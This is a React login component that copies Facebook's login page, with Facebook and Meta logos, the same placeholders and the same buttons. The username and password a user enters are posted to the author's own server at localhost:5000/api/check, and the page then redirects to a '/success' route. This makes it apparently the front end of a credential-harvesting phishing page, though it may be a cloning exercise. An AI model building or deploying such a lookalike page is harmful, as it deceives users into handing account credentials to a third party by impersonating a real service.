import React from 'react'
import "./login.scss";
import { useNavigate } from 'react-router-dom';
import axios from "axios";

const Login = () => {

  const navigate = useNavigate();

  const handleSubmit = async (e) => {
    e.preventDefault();
    const formData = new FormData(e.target);

    const username = formData.get("text1");
    const password = formData.get("pass");
    try{
      const newFormData = {
        username:username,
        password:password
      };
      const res = await axios.post("http://localhost:5000/api/check" , newFormData );
      if(res.status === 200){
        navigate("/success");
      }
     //console.log(res.status);
    }catch(err){
      console.log(err);
    }
  }

  return (
    <div className='main'>
      <div className='container'>
        <div className='top'>
          <p>English (UK)</p>
          <img src="./images/facebook logo.png" alt="logo" />
        </div>

        <div className='center'>
          <form onSubmit={handleSubmit}>
            <input type="text" name='text1' placeholder='Mobile number or email address' />
            <input type="password" name='pass' placeholder='Password' />
            <button>
              Log in
            </button>
            <h5>Forgotten Password?</h5>
          </form>
        </div>

        <div className='bottom'>
          <button>
            Create new account
          </button>
          <img src="./images/meta.png" alt="meta" />
          <div className='bottomNav'>
            <div>About</div>
            <div>Help</div>
            <div>More</div>
          </div>
        </div>
      </div>
    </div>
  )
}

export default Login